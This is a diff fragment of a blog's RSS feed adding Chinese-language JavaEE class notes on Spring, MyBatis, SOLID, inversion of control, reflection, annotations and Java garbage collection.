+&lt;/ul&gt;
+&lt;p&gt;设计思想：&lt;/p&gt;
+&lt;p&gt;1、Web应用是一个状态机，数据和视图一一对应&lt;/p&gt;
+&lt;p&gt;2、全局状态保存在一个对象中&lt;/p&gt;
 </description>
     </item>
     
@@ -1093,6 +1396,122 @@ x/s 0x56413d802c5d
 &lt;li&gt;通过队列，管道，信箱在任务间传递指针可能会创建共享数据&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id=&#34;实时操作系统的基本设计&#34;&gt;实时操作系统的基本设计&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>JavaEE课堂笔记</title>
+      <link>https://weivwang.github.io/studynotes/javaee%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/</link>
+      <pubDate>Sat, 23 Oct 2021 14:37:51 +0800</pubDate>
+      
+      <guid>https://weivwang.github.io/studynotes/javaee%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0/</guid>
+      <description>&lt;h1 id=&#34;javaee&#34;&gt;JavaEE&lt;/h1&gt;
+&lt;h2 id=&#34;第一周&#34;&gt;第一周&lt;/h2&gt;
+&lt;h3 id=&#34;主要讲ssmspring-springmvc-mybatis&#34;&gt;&lt;strong&gt;主要讲SSM：Spring-SpringMVC-Mybatis&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;​	Spring：通用框架。解决基础问题&lt;/p&gt;
+&lt;p&gt;​	Mybatis  ORM库，做object和relation的mapping&lt;/p&gt;
+&lt;p&gt;​	SpringMVC：web开发&lt;/p&gt;
+&lt;h3 id=&#34;框架和中间件区别&#34;&gt;&lt;em&gt;框架和中间件区别：&lt;/em&gt;&lt;/h3&gt;
+&lt;p&gt;​	框架framework：以sdk，jar包形式&lt;/p&gt;
+&lt;p&gt;​	中间件middle-ware：独立可运行，不依赖于程序&lt;/p&gt;
+&lt;p&gt;###&lt;strong&gt;new创建对象会带来很多问题&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;云计算dubbospringcloudk8s&#34;&gt;&lt;strong&gt;云计算：Dubbo，Springcloud，K8s&lt;/strong&gt;&lt;/h3&gt;
+&lt;p&gt;​	云计算springcloud，但K8s功能更强大&lt;/p&gt;
+&lt;p&gt;​	K8s通过环境管理配置，无侵入。将运维和业务分离&lt;/p&gt;
+&lt;p&gt;###&lt;strong&gt;OOP Solid&lt;/strong&gt;：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.jianshu.com/p/655ccb647152&#34;&gt;https://www.jianshu.com/p/655ccb647152&lt;/a&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;英文简写&lt;/th&gt;
+&lt;th&gt;名称&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;SRP&lt;/td&gt;
+&lt;td&gt;单一职责原则&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;OCP&lt;/td&gt;
+&lt;td&gt;开放封闭原则&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;LSP&lt;/td&gt;
+&lt;td&gt;里氏替换原则&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ISP&lt;/td&gt;
+&lt;td&gt;接口隔离原则&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;DIP&lt;/td&gt;
+&lt;td&gt;依赖倒置原则&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;###&lt;strong&gt;希望完成：编译时解耦合，运行时再有耦合&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​	IOC 控制反转：不要手工new对象，把对象创建交给spring容器，防止在编译期建立耦合&lt;/p&gt;
+&lt;p&gt;​	DI依赖注入：帮助在运行期建立耦合&lt;/p&gt;
+&lt;p&gt;###&lt;strong&gt;反射&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;this.engine = new Engine(); //原本new对象，会出现耦合，没有Engine类，编译不通过
+this.engine = (IEngine).Class.forName(&#39;com.demo.Engine&#39;).newInstance; //修改后，forName传字符串，字符串内容可以修改，编译能通过
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;###&lt;strong&gt;AOP：面向切面编程&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;​	Aspect-Oriented Programming&lt;/p&gt;
+&lt;p&gt;​	需要解决的问题：Java是静态的编程语言（不能在运行时修改类定义），带来扩展问题。有源码可以修改源代码，没有源代码没办法改。&lt;/p&gt;
+&lt;h2 id=&#34;第二周&#34;&gt;第二周&lt;/h2&gt;
+&lt;p&gt;###&lt;strong&gt;Java中认为最重要的类&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Object类&lt;/p&gt;
+&lt;p&gt;Class类&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+	&lt;span style=&#34;color:#75715e&#34;&gt;//类定义
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+	&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+    Person person1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Person&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;//如何获取类：用反射
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//1. 直接用Class.forName()
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Class clazz &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;forName&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;().&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;//
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//2，通过已有对象
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Class claxx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; person1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;//3，通过类
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    Class claxx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Person&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
+  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+	
+  &lt;span style=&#34;color:#75715e&#34;&gt;//能不能在方法中使用类的定义？，如：f(new Person())
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Object o&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
+    
+
+  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+  
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;###&lt;strong&gt;Annotation，注解&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//示例：@Commponent·
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@Target&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;ElementType&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;TYPE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;@Retention&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RetentionPolicy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;RUNTIME&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;@Documented&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;@Indexed&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;@interface&lt;/span&gt; Component &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+    String &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;//其中：
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@Target&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;({&lt;/span&gt;ElementType&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;TYPE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;})&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;@Retention&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RetentionPolicy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;RUNTIME&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;//希望把下面的注解保持到什么时候，给编译器看的
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//SOURCE表示这个Annotation类型的信息只会保留在源码里，源码经过编译之后，Annotation的数据就会消失，并不会保留在编译好的.class文件里；
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//CLASS表示这个Annotation类型的信息在源码保留，在.class文件也保留，但不会把这些信息加载到虚拟机（JVM）中，如果不设置，系统默认值是CLASS；
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//RUNTIME表示在源码，编译后的.class都保存信息，在执行的时候也会把这些信息加载到JVM中
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  
+&lt;span style=&#34;color:#a6e22e&#34;&gt;@Documented&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;//跟文档生成有关系
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;第三周&#34;&gt;第三周&lt;/h1&gt;
+&lt;h2 id=&#34;老师笔记&#34;&gt;老师笔记&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://thoughts.teambition.com/share/5f5dd6455e3f1f001682c1b4#5f5dc556db4eae9322a8be2e&#34;&gt;https://thoughts.teambition.com/share/5f5dd6455e3f1f001682c1b4#5f5dc556db4eae9322a8be2e&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;java垃圾回收&#34;&gt;Java垃圾回收&lt;/h2&gt;
+&lt;p&gt;参考资料：https://www.cnblogs.com/sunniest/p/4575144.html&lt;/p&gt;
+&lt;p&gt;内存泄露是指该内存空间使用完毕之后未回收，在不涉及复杂数据结构的一般情况下，Java 的内存泄露表现为一个内存对象的生命周期超出了程序需要它的时间长度，我们有时也将其称为“对象游离”。&lt;/p&gt;
+&lt;p&gt;1，引用计数法&lt;/p&gt;
+&lt;p&gt;2，tracing算法或mark and sweep算法&lt;/p&gt;
 </description>
     </item>
     
